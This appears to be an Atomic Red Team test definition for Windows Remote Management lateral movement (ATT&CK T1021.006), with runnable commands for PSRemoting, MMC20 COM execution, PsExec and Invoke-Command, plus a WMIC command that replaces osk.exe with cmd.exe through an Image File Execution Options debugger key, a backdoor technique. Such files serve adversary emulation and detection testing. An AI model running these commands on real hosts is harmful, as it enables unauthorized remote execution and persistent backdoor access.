attack_technique: T1021.006
display_name: 'Remote Services: Windows Remote Management'
atomic_tests:
- name: Enable Windows Remote Management
  auto_generated_guid: 9059e8de-3d7d-4954-a322-46161880b9cf
  description: |
    Powershell Enable WinRM

    Upon successful execution, powershell will "Enable-PSRemoting" allowing for remote PS access.
  supported_platforms:
  - windows
  executor:
    command: |
      Enable-PSRemoting -Force
    name: powershell
    elevation_required: true
- name: PowerShell Lateral Movement
  auto_generated_guid: 6dc74eb1-c9d6-4c53-b3b5-6f50ae339673
  description: |
    Powershell lateral movement using the mmc20 application com object.

    Reference:

    https://blog.cobaltstrike.com/2017/01/24/scripting-matt-nelsons-mmc20-application-lateral-movement-technique/

    Upon successful execution, cmd will spawn calc.exe on a remote computer.
  supported_platforms:
  - windows
  input_arguments:
    computer_name:
      description: Name of Computer
      type: string
      default: computer1
  executor:
    command: |
      [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","#{computer_name}")).Document.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")
    name: powershell
- name: WMIC Process Call Create
  auto_generated_guid: 5cd59c3b-1375-4edf-9bac-5851c9915fca
  description: |
    Utilize WMIC to start remote process.

    Upon successful execution, cmd will utilize wmic.exe to modify the registry on a remote endpoint to swap osk.exe with cmd.exe.
  supported_platforms:
  - windows
  input_arguments:
    user_name:
      description: Username
      type: String
      default: DOMAIN\Administrator
    password:
      description: Password
      type: String
      default: P@ssw0rd1
    computer_name:
      description: Target Computer Name
      type: String
      default: Target
  executor:
    command: |
      wmic /user:#{user_name} /password:#{password} /node:#{computer_name} process call create "C:\Windows\system32\reg.exe add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe\" /v \"Debugger\" /t REG_SZ /d \"cmd.exe\" /f"
    name: command_prompt
- name: Psexec
  auto_generated_guid: 9bab84a1-08fd-4245-b681-e62c78283002
  description: |
    Utilize psexec to start remote process.

    Upon successful execution, cmd will utilize psexec.exe to spawn cmd.exe on a remote system.
  supported_platforms:
  - windows
  input_arguments:
    user_name:
      description: Username
      type: String
      default: DOMAIN\Administrator
    psexec_exe:
      description: Path to PsExec
      type: string
      default: C:\PSTools\PsExec.exe
    password:
      description: Password
      type: String
      default: P@ssw0rd1
    computer_name:
      description: Target Computer Name
      type: String
      default: localhost
  dependencies:
  - description: |
      PsExec tool from Sysinternals must exist on disk at specified location (#{psexec_exe})
    prereq_command: |
      if (Test-Path "#{psexec_exe}") { exit 0} else { exit 1}
    get_prereq_command: |
      Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile "$env:TEMP\PsTools.zip"
      Expand-Archive $env:TEMP\PsTools.zip $env:TEMP\PsTools -Force
      New-Item -ItemType Directory ("#{psexec_exe}") -Force | Out-Null
      Copy-Item $env:TEMP\PsTools\PsExec.exe "#{psexec_exe}" -Force
  executor:
    command: |
      #{psexec_exe} \\#{computer_name} -u #{user_name} -p #{password} -s cmd.exe
    name: command_prompt
- name: Invoke-Command
  auto_generated_guid: 5295bd61-bd7e-4744-9d52-85962a4cf2d6
  description: |
    Execute Invoke-command on remote host.

    Upon successful execution, powershell will execute ipconfig on localhost using `invoke-command`.
  supported_platforms:
  - windows
  input_arguments:
    host_name:
      description: Remote Windows Host Name
      type: String
      default: localhost
    remote_command:
      description: Command to execute on remote Host
      type: String
      default: ipconfig
  executor:
    command: |
      invoke-command -ComputerName #{host_name} -scriptblock {#{remote_command}}
    name: powershell

